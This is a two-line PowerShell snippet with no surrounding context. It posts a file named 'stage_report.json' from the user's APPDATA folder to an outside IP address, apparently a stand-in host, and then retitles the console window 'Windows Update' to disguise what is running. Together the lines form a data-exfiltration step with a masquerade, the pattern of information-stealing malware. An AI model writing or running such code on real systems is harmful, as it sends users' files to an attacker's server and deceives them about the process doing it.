
Invoke-WebRequest -Uri 'https://192.0.2.247/upload' -Method Post -InFile "$env:APPDATA\stage_report.json" -ContentType "application/json"
$Host.UI.RawUI.WindowTitle = "Windows Update"
